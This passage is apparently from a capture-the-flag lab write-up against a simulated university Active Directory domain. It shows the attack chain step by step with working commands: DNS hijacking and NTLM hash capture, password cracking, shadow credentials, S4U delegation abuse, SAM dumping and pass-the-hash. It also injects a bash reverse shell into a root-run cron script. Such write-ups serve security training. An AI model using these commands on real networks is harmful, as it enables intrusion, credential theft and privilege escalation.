![BloodHound — svc_webmonitor outbound: AddKeyCredentialLink on svc_files + cert template enrollment](/assets/images/westbridge-bh-svcwebmonitor-outbound.png)

![BloodHound — the AddKeyCredentialLink edge](/assets/images/westbridge-bh-svcwebmonitor-addkeycred.png)

| Edge | Target | Meaning |
|---|---|
| **AddKeyCredentialLink** | `svc_files` | Can append a Key Credential to svc_files's `msDS-KeyCredentialLink` — the Shadow Credentials primitive. No password needed; once the key is planted, certipy authenticates as svc_files via PKINIT and the NT hash drops out of the PAC. |
| **Enroll** | `User`, `ClientAuth`, `UserSignature`, `EFS` cert templates (CA01-AD-CA) | Can request a certificate from the domain CA as svc_webmonitor — the authentication artifact certipy needs to PKINIT as svc_files after planting the key. |
| MemberOf | **WEB BACKUP MAINTAINERS** | The group that justifies the account's existence on the web tier. Not directly exploitable, but explains why this account exists. |
| MemberOf | Domain Users / Authenticated Users / Everyone | Baseline. |

Two things stand out:

1. **svc_webmonitor is NOT svc_web.** The next section, [Section 12.4](#124-who-is-svc_web), shows svc_web's graph — a different account (RID 9506 vs RID 9521), with different edges. svc_web holds Enroll on the same cert templates but has *no* AddKeyCredentialLink on svc_files. The script runs as svc_webmonitor; the coercion captures svc_webmonitor's NTLM; the Shadow Credential edge belongs to svc_webmonitor. Keep the accounts straight.
2. **The AddKeyCredentialLink ➜ svc_files edge is the whole point.** Everything else in this section (DNS hijack, hash capture, crack) is prep work to unlock that one edge. Once we have svc_webmonitor's password, certipy shadow auto does the rest in one command — and svc_files's constrained delegation to FILES$ ([Section 8.3](#83-delegation) turns that into SYSTEM-equivalent on the file server.

> **RID detail:** svc_webmonitor is RID 9521. svc_web is RID 9506. Both are in the 9500+ range (domain's service account band), both have "password never expires" since the domain build, and both enrolled on the same cert templates — but only svc_webmonitor holds the key-trust edge. The lab makes you tell them apart.

### 12.3.1 Why These Three FQDNs?

Returning to the script's target list with the account identity fixed:

```powershell
$targets = @(
    "webstatus.westbridge.hsm",
    "webportal.westbridge.hsm",
    "webmonitor.westbridge.hsm"
)
```

These aren't random — they're the three service FQDNs a *web monitoring* service account would plausibly check. But from an attacker's lens they're a credential coercion surface: each one, when resolved via DNS to our IP and hit by the script's `-UseDefaultCredentials` request, sends `svc_webmonitor`'s NTLMv2 to us. Three targets, one every 60 seconds, one captured hash. We only need to own one of the three DNS records; the other two are decoys for the lab's narrative.

## 12.4 Who Is svc_web?

![BloodHound — svc_web outbound control](/assets/images/westbridge-bh-svcweb-outbound.png)

![BloodHound — svc_web group memberships](/assets/images/westbridge-bh-svcweb-memberof.png)

 svc_web is the account with the most coincidence-free name in the domain's service band — and the closest thing to a decoy in this lab. BloodHound's picture of the account behind the *monitor script* actually belongs to `svc_webmonitor`; `svc_web` (RID 9506) is a *different* account that happens to live in the same 9500+ range, share "password never expires" since the domain build, and enroll on the same cert templates. Its graph says nothing about `svc_files`.

| Edge | Meaning |
|---|---|
| MemberOf **WEB BACKUP MAINTAINERS** | backup/maintenance role on the web tier |
| Enroll rights on **User / ClientAuth / UserSignature / EFS** cert templates | AD CS enrollment as this account — ESC-hunting surface |
| Domain Users / Authenticated Users / Everyone | baseline |

No direct ACL edges to `svc_files` from `svc_web` — the AddKeyCredentialLink edge belongs to **`svc_webmonitor`** (RID 9521), the account actually running the script. So the play stays what it was in [Section 12.3](#123-the-account-behind-the-script--svc_webmonitor): capture `svc_webmonitor`'s credentials from the monitoring script's own traffic, and leave `svc_web`'s cert-enrollment surface for a separate ESC hunt if you have cycles.

## 12.5 The Plan — Own the Three Names

The script pings three FQDNs every 60 seconds using `-UseDefaultCredentials`, which sends the running account's NTLMv2 to whoever answers. If we control DNS for even one of those names, we catch the hash. Here's how that plays out, command by command.

### 12.5.1 Check where the names resolve today

First, check whether the three FQDNs currently resolve and where they point. The script targets `webstatus`, `webportal`, and `webmonitor` — all under `westbridge.hsm`. If any of them already resolve to a live host, hijacking DNS won't be necessary (but in this lab they don't).

```bash
➜ for h in webstatus webportal webmonitor; do
  printf '%-12s -> ' "$h"; dig +short @10.0.10.5 $h.westbridge.hsm A
done

webstatus    -> webportal    -> webmonitor   ->
```

The loop queries the domain controller (10.0.10.5) directly for each name. The empty output after each `->` confirms none of the three FQDNs have an A record in the DC's DNS — exactly the gap we exploit.

### 12.5.2 Start the NTLM listener

Before poisoning DNS, we need a listener ready to catch the incoming NTLM authentication. Responder is the standard tool for this.

```bash
⚡ responder -I tun0 -v
```

`-I tun0` binds Responder to the attacking interface (the VPN tunnel). `-v` enables verbose output so we can see the captured NTLM handshake details in real time. The listener stays up waiting for any host that resolves one of our poisoned names to our IP.

### 12.5.3 Hijack `webstatus.westbridge.hsm` in DNS

Now we inject a rogue A record into the domain's DNS via LDAP. `dnstool` uses the domain credentials we already have (`r.anderson : SecretMyth123!`) to talk to the DC's DNS service directly.

```bash
➜ dnstool -u 'westbridge\r.anderson' -p 'SecretMyth123!' \
    --action add --type A \
    --record webstatus.westbridge.hsm \
    --data 192.168.211.2 \
    -dns-ip 10.0.10.5 \
    dc.westbridge.hsm

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding extra record
[+] LDAP operation completed successfully
```

This command adds an A record for `webstatus.westbridge.hsm` pointing to `192.168.211.2` (our tun0 IP). The DC's DNS server now answers queries for `webstatus.westbridge.hsm` with our address. We chose `webstatus` simply because it's the first name in the script's list — any of the three would work.
### 12.5.4 Verify the record was added (dnstool query)

We confirm the injection stuck by querying the same record back.

```bash
➜ dnstool -u 'westbridge\r.anderson' -p 'SecretMyth123!' \
    --action query \
    --record webstatus.westbridge.hsm \
    -dns-ip 10.0.10.5 \
    dc.westbridge.hsm

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found record webstatus
 - Type: 1 (A) (Serial: 387)
 - Address: 192.168.211.2
```

The query returns our record: type 1 (A record), serial 387, address `192.168.211.2`. The output matches the original exactly — nothing is omitted.

### 12.5.5 Independent DNS verification (dig)

As a sanity check, we verify the record from the client side using `dig` against the DC's DNS port.

```bash
➜ dig @10.0.10.5 webstatus.westbridge.hsm +noall +answer
webstatus.westbridge.hsm. 180   IN      A       192.168.211.2
```

`+noall +answer` strips everything except the answer section. The result confirms `webstatus.westbridge.hsm` resolves to `192.168.211.2` with a TTL of 180 seconds. This `dig` check (same tool we used in Step 1) proves the poison is live in the DC's DNS — the script's next 60-second cycle will now send its NTLMv2 to us.

### 12.5.6 Hash capture

With DNS poisoned and Responder listening, the script's next 60-second cycle hits our IP. Responder captures the incoming NTLMv2 authentication from the FILES host:

```bash
[HTTP] GET request from: ::ffff:10.0.10.15  URL: /
[HTTP] NTLMv2 Client   : 10.0.10.15
[HTTP] NTLMv2 Username : WESTBRIDGE\svc_webmonitor
[HTTP] NTLMv2 Hash     : svc_webmonitor::WESTBRIDGE:27768ca47d2e4084:DAC3B95D74A0B36878D5C1E9552D9A5A:01010000000000002D81BBF1DF32DD0173001A55CB22B19B000000000200080033004C005900450001001E00570049004E002D004C0058005400440056003600390031003300430041000400140033004C00590045002E004C004F00430041004C0003003400570049004E002D004C0058005400440056003600390031003300430041002E0033004C00590045002E004C004F00430041004C000500140033004C00590045002E004C004F00430041004C000800500050000000000000000000000000200000DBB480CC99FBF021DEB29D5B253AC00C2B6168DCA2A8E954582A1E77D8342DF35C4413DC32AF485014FC4F7E5280FB7895F394391B1A0541B4DEBA1326C2DC790A0010000000000000000000000000000000000009003A0048005400540050002F007700650062007300740061007400750073002E0077006500730074006200720069006400670065002E00680073006D000000000000000000
```

The first line is Responder reporting an NTLM authentication request arriving from the FILES host (10.0.10.15). The script's `-UseDefaultCredentials` web request triggered the NTLM handshake, and our poisoned DNS record (`webstatus.westbridge.hsm` ➜ `192.168.211.2`) routed it to us instead of wherever it was supposed to go. The captured username is `WESTBRIDGE\svc_webmonitor` — exactly the service account the script runs as — and the NTLMv2 hash (prefix shown) is what we feed to hashcat next.

### 12.5.7 Crack the Hash

```bash
➜ hashcat --identify hash.txt
   5600 | NetNTLMv2                                                  | Network Protocol

➜ hashcat -a 0 -m 5600 hash.txt /opt/SecLists/rockyou.txt -d 1

...[snip]...
SVC_WEBMONITOR::WESTBRIDGE:27768ca47d2e4084:dac3b95d74a0b36878d5c1e9552d9a5a:01010000000000002d81bbf1df32dd0173001a55cb22b19b000000000200080033004c005900450001001......065002e00680073006d000000000000000000:eazypassword
```

`hashcat --identify` confirms the captured blob is **NetNTLMv2** (mode `5600`); the next line runs a straight dictionary attack against rockyou. The trailing `:eazypassword` on the cracked line is the plaintext — `svc_webmonitor` just handed us its password in a few seconds because rockyou is short and NTLMv2's keyspace is small enough for one GPU to exhaust.

`svc_webmonitor : eazypassword` cracked.

---

# 13. The Chain Ahead — svc_webmonitor ➜ svc_files ➜ FILES$

> Shadow Credentials: write a key to the door, kinit your way in, and let S4U do the rest. The machine account never knew it was holding your TGT.

The two BloodHound edges we've been carrying since [Section 8.4](#84-non-default-acl-edges) finally connect into one path. Let's read them properly:

## 13.1 Edge #1 — AddKeyCredentialLink

`svc_webmonitor` holds **AddKeyCredentialLink over `svc_files`** — the exact primitive behind **Shadow Credentials**. (The BloodHound graph for this edge — `svc_webmonitor` outbound with AddKeyCredentialLink on `svc_files` plus its cert-template enrollment — was shown back in [Section 12.3](#123-the-account-behind-the-script--svc_webmonitor), so we won't repeat the screenshots here.) What that means mechanically:

* Every AD account can authenticate with a certificate via *Key Trust* — the public half of
  the key lives in the account's `msDS-KeyCredentialLink` attribute (its "Key Credentials").
* Anyone with **write access to that attribute** can append their **own** key credential.
* From then on, they can Kerberos-PKINIT **as that account** using their own private key.
  No password ever touched, nothing overwritten, fully offline after the initial write.

`svc_webmonitor` can also **Enroll** on the `User`, `ClientAuth`, `UserSignature`, and `EFS` cert templates under `CA01-AD-CA`. That's our source of a valid authentication certificate once certipy plants the key credential — no need for any other CA access.

## 13.2 Edge #2 — Constrained Delegation to FILES$

![BloodHound — svc_files AllowedToDelegate to FILES / FILES.WESTBRIDGE.HSM](/assets/images/westbridge-bh-svcfiles-delegate.png)

`svc_files` is **Trusted for Kerberos Constrained Delegation**, with its SPN list pointing at `FILES` / `FILES.WESTBRIDGE.HSM`. Delegation semantics:

* A principal trusted for delegation may obtain service tickets **on behalf of any other
  user** to the services in its `msDS-AllowedToDelegateTo` list.
* With **protocol transition** (`TRUSTED_TO_AUTH_FOR_DELEGATION`), the KDC will issue that ticket even if the user never authenticated to the principal — it just *asserts* the identity. That's what makes the "impersonate anyone" step possible without the user's password: `svc_files` asks for an S4U2Self ticket "as" Administrator, then chains it (S4U2Proxy) toward the target service.
* Practically: whoever controls `svc_files`'s identity can present themselves to FILES as **Domain Admin if they feel like it**.

## 13.3 Composing the chain

```
svc_webmonitor : eazypassword          (captured via DNS-hijack coercion)
        │  1. certipy: use svc_webmonitor to write a Key Credential onto svc_files
        ▼
control of svc_files's Kerberos identity   (password still unknown — irrelevant)
        │  2. getST.py -impersonate administrator -spn HOST/FILES.westbridge.hsm
        ▼
S4U2Self + S4U2Proxy ticket as Administrator@WESTBRIDGE.HSM ➜ HOST/FILES$
        │  3. use the ticket against FILES
        ▼
FILES.westbridge.hsm — including IT-Share ("Administrators Only")
```

## 13.4 Execution — Shadow Credentials + S4U + Pass-the-Hash

First, confirm the cracked account is live domain-wide:

```bash
➜ nxc smb 10.0.10.0/24 \
    -u 'svc_webmonitor' -p 'eazypassword'

SMB         10.0.10.15      445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         10.0.10.5       445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:westbridge.hsm) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.0.10.15      445    FILES            [+] westbridge.hsm\svc_webmonitor:eazypassword
SMB         10.0.10.5       445    DC               [+] westbridge.hsm\svc_webmonitor:eazypassword
```

The cracked password authenticates to both FILES and the DC over SMB, so `svc_webmonitor` is a live, reachable account — exactly what we need before exercising its AddKeyCredentialLink right on `svc_files`. (The constrained-delegation trust that powers the second half of this chain is already proven by the BloodHound edge in [Section 13.2](#132-edge-2--constrained-delegation-to-files); we don't need a separate delegation query to confirm it.)

**Step 1 — plant the shadow credential.** Certipy's `shadow auto` does the whole loop: generate a key pair + DeviceID ➜ append it to `svc_files`'s `msDS-KeyCredentialLink` (exercising our AddKeyCredentialLink right) ➜ PKINIT-authenticate as `svc_files` using the new cert ➜ fetch a TGT ➜ then read the account's NT hash out of the PAC *inside that TGT* (a bonus of Key Trust logons) ➜ finally restore the original attribute, leaving no visible key residue:

```bash
➜ certipy shadow auto \
    -u 'svc_webmonitor@westbridge.hsm' -p 'eazypassword' \
    -account svc_files \
    -target westbridge.hsm -dc-host dc.westbridge.hsm -dc-ip 10.0.10.5
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting user 'svc_files'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '968f8ccc5ef84910baf6ffbd97bcd7c7'
[*] Adding Key Credential with device ID '968f8ccc5ef84910baf6ffbd97bcd7c7' to the Key Credentials for 'svc_files'
[*] Successfully added Key Credential with device ID '968f8ccc5ef84910baf6ffbd97bcd7c7' to the Key Credentials for 'svc_files'
[*] Authenticating as 'svc_files' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'svc_files@westbridge.hsm'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'svc_files.ccache'
[*] Wrote credential cache to 'svc_files.ccache'
[*] Trying to retrieve NT hash for 'svc_files'
[*] Restoring the old Key Credentials for 'svc_files'
[*] Successfully restored the old Key Credentials for 'svc_files'
[*] NT hash for 'svc_files': 0eb58f71ee3cd38f9e695b3270596a9f
```

We never learned `svc_files`'s password — and we didn't need to. We now hold both its **ccache** (`svc_files.ccache`) and its **NT hash** (`0eb58f71...`). The key credential was planted, used, and then removed — `msDS-KeyCredentialLink` on `svc_files` is back to its original state. No forensic residue from the shadow credential itself.

**Step 2 — S4U2Self + S4U2Proxy: forge a ticket as Administrator to FILES.** We have `svc_files`'s identity now; its constrained delegation trust lets it request service tickets on behalf of *any other user* to the SPNs in its `msDS-AllowedToDelegateTo` list (`FILES` / `FILES.WESTBRIDGE.HSM`). Using `getST.py` from Impacket, we ask the KDC for an S4U2Self ticket "as" Administrator — and because `svc_files` carries `TRUSTED_TO_AUTH_FOR_DELEGATION` (protocol transition), the KDC mints that ticket with no prior credential from Administrator; S4U2Proxy then forwards it to `HOST/FILES.westbridge.hsm`. That's the whole reason no password is involved:

```bash
➜ env KRB5CCNAME=svc_files.ccache \
getST.py \
    westbridge.hsm/svc_files \
    -k -no-pass \
    -spn 'HOST/FILES.westbridge.hsm' \
    -impersonate Administrator \
    -dc-ip 10.0.10.5 \

[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@HOST_FILES.westbridge.hsm@WESTBRIDGE.HSM.ccache
```

**Step 3 — prove it and cash out.** First, inspect the forged ticket to confirm it's the right service principal and the right impersonated user:

```bash
➜ klist Administrator@HOST_FILES.westbridge.hsm@WESTBRIDGE.HSM.ccache
Ticket cache: FILE:Administrator@HOST_FILES.westbridge.hsm@WESTBRIDGE.HSM.ccache
Default principal: Administrator@westbridge.hsm

Valid starting       Expires              Service principal
08/28/2026 23:52:00  08/29/2026 09:51:24  HOST/FILES.westbridge.hsm@WESTBRIDGE.HSM
        renew until 08/29/2026 23:51:23
```

Default principal reads `Administrator@westbridge.hsm` — we're carrying Administrator's identity, not `svc_files`'s. The service principal is `HOST/FILES.westbridge.hsm@WESTBRIDGE.HSM`, exactly the SPN we targeted. The ticket is live for the next ~10 hours.

Hit SMB on FILES with the ticket:

```bash
➜ env KRB5CCNAME=Administrator@HOST_FILES.westbridge.hsm@WESTBRIDGE.HSM.ccache \
nxc smb files.westbridge.hsm -k --use-kcache

SMB         files.westbridge.hsm 445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         files.westbridge.hsm 445    FILES            [+] westbridge.hsm\Administrator from ccache (Pwn3d!)
```

`(Pwn3d!)` — the forged ticket authenticates as local Administrator on FILES. Dump the SAM while we're here:

```bash
➜ env KRB5CCNAME=Administrator@HOST_FILES.westbridge.hsm@WESTBRIDGE.HSM.ccache \
nxc smb files.westbridge.hsm -k --use-kcache --sam

SMB         files.westbridge.hsm 445    FILES            [*] Windows 11 / Server 2025 Build 26100 x64 (name:FILES) (domain:westbridge.hsm) (signing:True) (SMBv1:False)
SMB         files.westbridge.hsm 445    FILES            [+] westbridge.hsm\Administrator from ccache (Pwn3d!)
SMB         files.westbridge.hsm 445    FILES            [*] Dumping SAM hashes
SMB         files.westbridge.hsm 445    FILES            Administrator:500:aad3b435b51404eeaad3b435b51404ee:fa2f058969c315b0fcae96ed6ec268fb:::
SMB         files.westbridge.hsm 445    FILES            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         files.westbridge.hsm 445    FILES            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         files.westbridge.hsm 445    FILES            WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7490f2a63d713a813eda5bf8fd1a8227:::
SMB         files.westbridge.hsm 445    FILES            [+] Added 4 SAM hashes to the database
```

Local Administrator hash: `fa2f058969c315b0fcae96ed6ec268fb`. Pass-the-hash into WinRM for an interactive shell using [winrmexec](https://github.com/ozelis/winrmexec) (`evil_winrmexec`):

```bash
➜ evil_winrmexec \
    westbridge.hsm/administrator@files.westbridge.hsm \
    -hashes ':fa2f058969c315b0fcae96ed6ec268fb'

...[snip]...

PS C:\Users\Administrator\Documents> whoami; hostname
files\administrator
FILES
```

### 13.4.1 Captured Flag #2

```powershell
PS > type ..\Desktop\*
Flag02[FILE_XXXXXX_0wned]
```

FILES compromised. Local Administrator on FILES via S4U constrained delegation through `svc_files`, pivoted from the DNS-coerced `svc_webmonitor` credential. Two hosts down (SQL = SYSTEM, FILES = local Admin), and the technique stack now runs end-to-end: *web foothold ➜ LDAP dump ➜ Kerberos abuse ➜ silver ticket ➜ DB backup creds ➜ OU ACL abuse ➜ DNS coercion ➜ shadow credentials ➜ constrained delegation.*

---

# 14. WEB — SSH Key, Cron, and a Kerberos Shortcut

## 14.1 The SSH Key Sitting in the Backup

With local admin on FILES, `C:\` itself is browsable — and `C:\IT-Share` (the "Administrators Only" share) finally opens:

```bash
PS C:\> dir

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/12/2025  11:02 AM                inetpub
d-----         7/15/2026   5:13 PM                IT-Share
d-----          4/1/2024   7:02 AM                PerfLogs
d-r---        11/14/2024   1:26 AM                Program Files
d-r---          4/1/2024   8:16 AM                Program Files (x86)
d-----          7/7/2026   2:49 PM                Scripts
d-----          7/7/2026   7:32 PM                Students
d-r---         7/12/2026  12:10 PM                Users
d-----         8/22/2026   8:20 PM                Windows
-a----          7/4/2026   8:04 AM          12288 DumpStack.log
```

*Listing `C:\` from the FILES local-Admin shell proves `IT-Share` (the "Administrators Only" share) is now browsable — that's where the web backup lives.*

```bash
PS C:\> dir IT-Share

    Directory: C:\IT-Share

Mode                 LastWriteTime         Length Name
----                 -------------         ------
d-----          7/4/2026   9:56 AM                Backup
d-----          7/7/2026   3:08 PM                Deployment
d-----          7/7/2026   9:09 PM                Documentation
```

*Drilling into `IT-Share` exposes three subfolders — `Backup`, `Deployment`, `Documentation` — and the SSH key we want sits under `Backup\WEB`.*

```bash
PS C:\> tree IT-Share /a /f
Folder PATH listing for volume Windows
Volume serial number is 7EC2-1A39
C:\IT-SHARE
+---Backup
|   \---WEB
|       |   id_ed25519
|       |   id_ed25519.pub
|       |
|       \---www
|           \---html
|                   academics.html
|                   background.png
|                   campus.html
|                   campus_map.png
|                   index.html
|                   library.html
|                   programs.html

+---Deployment
|       7z2602-x64.msi
|       ntrights.exe
|       SQL2019-SSEI-Expr.exe
|       vlc-3.0.23-win32.exe

\---Documentation
        Cybersecurity_Guidelines_2026.pdf
        NetworkTopology.png
        Password_Policy.txt
```

*The full tree confirms `C:\IT-Share\Backup\WEB\` holds `id_ed25519` + `id_ed25519.pub` — the web server's SSH keypair — plus a `www\html` mirror of the site content.*

Pulling both halves of the keypair off FILES with winrmexec's `!download` cmdlet:

```bash
PS C:\IT-Share\Backup\WEB> !download id_ed25519
downloading C:\IT-Share\Backup\WEB\id_ed25519
done, writing to /home/deus/CTF/HackSmarter/Ranges/WestbridgeUniversity/www/id_ed25519

PS C:\IT-Share\Backup\WEB> !download id_ed25519.pub
downloading C:\IT-Share\Backup\WEB\id_ed25519.pub
done, writing to /home/deus/CTF/HackSmarter/Ranges/WestbridgeUniversity/www/id_ed25519.pub
```

*We keep both keys locally so the SSH client can present the keypair.*

*Recap: the university backed up the web server's content — including its live SSH keypair — to a file share we can now read as FILES local Admin. The only step left is to use that key.*

## 14.2 Shell as svc_web — and the SSSD Username Quirk

First SSH attempts fail — the trick is how SSSD on this box expects the name (`use_fully_qualified_names = True`):

First, lock down the key permissions (SSH refuses keys that are world-readable):

```bash
➜ chmod 600 id_ed25519 id_ed25519.pub
```

*SSH refuses private keys that are group/other-readable, so we tighten perms to `600` before using the keypair.*

Now the obvious login form — bare `svc_web@` — is rejected:

```bash
➜ ssh -i id_ed25519 svc_web@web.westbridge.hsm
Warning: Permanently added 'web.westbridge.hsm' (ED25519) to the list of known hosts.
svc_web@web.westbridge.hsm: Permission denied (publickey).
```

*The bare `svc_web@` UPN is denied — a first signal this box's SSSD wants the fully-qualified name, not the short form.*

That's the SSSD quirk: with `use_fully_qualified_names = True`, the box only accepts the UPN-style `svc_web@westbridge.hsm` as the remote user. We wrap it as `"svc_web@westbridge.hsm"@10.0.10.10` to force the FQDN user against the IP — and the shell lands:

```bash
➜ ssh -i id_ed25519 "svc_web@westbridge.hsm"@10.0.10.10
Warning: Permanently added '10.0.10.10' (ED25519) to the list of known hosts.
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 7.0.0-1010-aws x86_64)

Last login: Sun Aug 23 09:48:43 2026 from 10.0.30.4

svc_web@westbridge.hsm@web:~$ whoami && id
svc_web@westbridge.hsm
uid=337209506(svc_web@westbridge.hsm) gid=337200513(domain users@westbridge.hsm) groups=337200513(domain users@westbridge.hsm),337209505(web backup maintainers@westbridge.hsm)

svc_web@westbridge.hsm@web:~$ hostname
web.westbridge.hsm
```

*Confirming the shell is on the WEB host, as the low-priv domain account `svc_web` whose group (`web backup maintainers`) owns the cron script we hijack next.*

## 14.3 Cron Hijack — Group-Writable Backup Script

**The web box, as the account whose group owns the backup script.** On-box recon finds:

```bash
svc_web@westbridge.hsm@web:~$ ps -eo user,pid,cmd | grep -i web
root        2295 sshd: svc_web@westbridge.hsm [priv]
svc_web+    2302 /usr/lib/systemd/systemd --user
svc_web+    2303 (sd-pam)
svc_web+    2359 sshd: svc_web@westbridge.hsm@pts/0
svc_web+    2360 -bash
svc_web+    2617 bash linpeas.sh
root        2809 sshd: svc_web@westbridge.hsm [priv]
svc_web+    2902 sshd: svc_web@westbridge.hsm@pts/1
svc_web+    2903 -bash
svc_web+   41234 /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
svc_web+   42768 bash linpeas.sh
svc_web+   42769 timeout 1 sh -c echo id | newgrp "systemd-journal"
svc_web+   42770 sh -c echo id | newgrp "systemd-journal"
svc_web+   42773 ps -eo user,pid,cmd
svc_web+   42774 grep -i web
```

*Process listing shows our `svc_web` session and a couple of `linpeas.sh` runs — no sign of the backup job itself, so we locate it by ownership instead.*

```bash
svc_web@westbridge.hsm@web:~$ find / -group "web backup maintainers@westbridge.hsm" 2>/dev/null | grep -Ev '^/(run|sys|proc|home)'
/var/backups/web
/opt/web_backup/web_backup.sh
```

*Finding every file owned by `svc_web`'s group turns up `/opt/web_backup/web_backup.sh` — the cron-driven backup — and its output dir `/var/backups/web`.*

```bash
svc_web@westbridge.hsm@web:~$ cat /opt/web_backup/web_backup.sh
#!/bin/bash
set -euo pipefail

SRC="/var/www/html"
DEST="/var/backups/web"
BACKUP="${DEST}/web_latest.tar.gz"

mkdir -p "$DEST"

tar -czf "$BACKUP" -C "$SRC" .

chmod 640 "$BACKUP"
```

*Reading the script: it tars `/var/www/html` into `/var/backups/web`. We'll inject a reverse shell so the next cron run executes it under the script's running identity.*

```bash
svc_web@westbridge.hsm@web:~$ ls -la /opt/web_backup/web_backup.sh
-rwxrwxr-x+ 1 root web backup maintainers@westbridge.hsm 181 Jul 28 20:17 /opt/web_backup/web_backup.sh
```

*Crucially the file is `rwxrwxr-x+` — group-writable by `web backup maintainers`, our own group. The owner is `root`, so the cron context that runs it is privileged; we own the content, not the owner.*

One false start worth documenting: the first injection used `sed -i '1i ...'` — which puts the reverse shell *above* the `#!/bin/bash` shebang. The shebang stops being a shebang on line 2, so the cron run can't execute the script at all. Remove it, then append *after* line one instead:

Start the listener on the attacker box:

```bash
➜ penelope -p 8284
```

*We open a Penelope listener on port 8284 to catch the reverse shell the cron job will throw back.*

Inject the reverse shell as the script's line 2 (right after the shebang):

```bash
svc_web@westbridge.hsm@web:~$ sed -i '1a (bash -i >& /dev/tcp/192.168.211.2/8284 0>&1) &' /opt/web_backup/web_backup.sh
```

*`sed -i '1a ...'` appends our reverse-shell one-liner immediately after line 1, so the shebang stays intact on line 1 and the shell fires on the next cron tick.*

```bash
svc_web@westbridge.hsm@web:~$ cat /opt/web_backup/web_backup.sh
#!/bin/bash
(bash -i >& /dev/tcp/192.168.211.2/8284 0>&1) &
set -euo pipefail
...[snip]...
```

*Verifying the injection: the reverse-shell line now sits at line 2, immediately under the shebang, exactly where it needs to be.*

Next run, the callback lands — as a user we've never seen anywhere in the domain dump:

```bash
e.mitchell@web:~$ whoami && id
e.mitchell
uid=1001(e.mitchell) gid=1001(e.mitchell) groups=1001(e.mitchell),1002(studentportaladmins)

e.mitchell@web:~$ hostname
web.westbridge.hsm
```

*The cron callback arrives as `e.mitchell` — a member of `studentportaladmins`, the group that can read the student portal's user store we'll crack next. Note this identity is local to the portal, not in the AD dump, by confirming the shell is on the WEB host.*

Clean-up immediately — strip the injected line (it's line 2) so nobody spots it, and, just as important, so the next cron tick runs the *pristine* backup job rather than our one-shot shell: a broken or missing script would crash the webserver's backup and trip monitoring. (The Penelope listener we started earlier — brought up with several calls on port 8284 — is torn down too, once the shell is confirmed.)

```bash
svc_web@westbridge.hsm@web:~$ sed -i '2d' /opt/web_backup/web_backup.sh
svc_web@westbridge.hsm@web:~$ head -n 2 /opt/web_backup/web_backup.sh
#!/bin/bash
set -euo pipefail
```

*The `sed -i '2d'` removes the injected reverse-shell line; `head -n 2` confirms the script is back to its pristine opening — shebang plus `set -euo pipefail` — with no residue of our injection.*

## 14.4 Password123 — d.reynolds' sudo to root

e.mitchell can read the student portal's user store:

```bash
e.mitchell@web:~$ ls -lR /var/www/data
/var/www/data:
total 4
drwxr-s--- 2 www-data studentportaladmins 4096 Jul 27 18:17 studentportal

/var/www/data/studentportal:
total 16
-rw-r--r-- 1 www-data www-data 12890 Jul 27 18:17 users.json
```

*The `studentportal` directory is mode `drwxr-s---` group `studentportaladmins` — a group `e.mitchell` belongs to — so we can read `users.json`, the portal's credential store.*

```bash
e.mitchell@web:~$ cat /var/www/data/studentportal/users.json
{
    "d.reynolds@westbridge.hsm": {
        "fullName": "d.reynolds",
        "email": "d.reynolds@westbridge.hsm",
        "studentId": "WB-2026-999",
        "program": "Business \r\n                        Administration",
        "password": "$2y$10$mRCQxe\/f5AEhuyi1sZKoyuOCfUeAroZ\/dDhOgrUcrGCRxqRpfnRRi",
        "registeredAt": "2026-07-27T16:11:26+00:00",
        "status": "Active",
        "accountType": "Staff,Administrators",
        "courses": [
...[snip]...

### 14.4.1 bcrypt hashes for: d.reynolds (Staff,Administrators), e.mitchell, n.brooks, l.reed, l.cole  (all Students)
```

*Dumping the JSON shows bcrypt (`$2y$`) password hashes and an `accountType` field. The `Staff,Administrators` tag on d.reynolds is our triage signal — staff accounts are the privilege targets; students are noise.*

```bash
e.mitchell@web:~$ python3 -c "import json; d=json.load(open('/var/www/data/studentportal/users.json')); [print(k, v['fullName'], v['accountType'], v['password'], sep='\t') for k,v in d.items()]"

d.reynolds@westbridge.hsm       d.reynolds      Staff,Administrators    $2y$10$mRCQxe/f5AEhuyi1sZKoyuOCfUeAroZ/dDhOgrUcrGCRxqRpfnRRi
n.brooks@westbridge.hsm n.brooks        Student $2y$10$8wNlBZIztDGBJztJhBPa/uEV840u0jYjDxF7zH0BJ3HRlzbKrcZjW
l.reed@westbridge.hsm   l.reed  Student $2y$10$RGQ0z9GX.ZcrGHkGlgf9XOlc.ubkqbpx1l.D7s0.4ArqcRSQ/Eu2C
l.cole@westbridge.hsm   l.cole  Student $2y$10$zTzuHd4RAdqEkm6.NvaXi.mDvBc29DSMItP8kZWi868H3iUDbAC7.
e.mitchell@westbridge.hsm       e.mitchell      Staff,Administrators    $2y$10$QCVYL2rECuJ2uVYAKMg06uO3iChZBKEznAtD.ngTECjIfdBdNQT6a
```

*Flattening the JSON with python3 yields a clean five-row table of emails, account types, and bcrypt hashes — exactly what we feed to hashcat.*

```bash
➜ hashcat --identify /tmp/hash.txt
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
```

*Identifying the hash mode: bcrypt is hashcat mode `3200` — that's the mode to attack.*

```bash
